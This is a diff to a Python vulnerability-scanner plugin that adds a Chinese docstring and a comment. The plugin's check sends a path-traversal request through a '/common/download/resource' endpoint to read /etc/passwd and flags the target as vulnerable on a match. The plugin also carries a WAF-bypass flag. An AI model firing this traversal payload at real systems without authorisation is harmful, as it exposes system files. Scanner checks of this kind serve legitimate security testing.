@@ -42,6 +42,12 @@ class FileReadPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
+        """通过 /common/download/resource 路径穿越读取 /etc/passwd 验证漏洞
+
+        @param target: 目标主机，用于拼接下载接口地址
+        @param session: 复用的 HTTP 会话对象
+        @return: ScanResult——响应同时含 'root' 与 ':/' 特征为 CONFIRMED，否则 SAFE
+        """
         # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
         url = join_url(target, "/common/download/resource?resource=/profile/../../../../../../../etc/passwd")
         try:
@@ -61,6 +67,7 @@ class FileReadPlugin(PluginBase):
                 url=url,
                 evidence="响应含 root 与 :/ 特征（/etc/passwd）",
                 fix=self.fix,
+                # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计
                 extra={
                     "vuln_type": "arbitrary_file_read",
                     "payload_class": "traversal_etc_passwd",
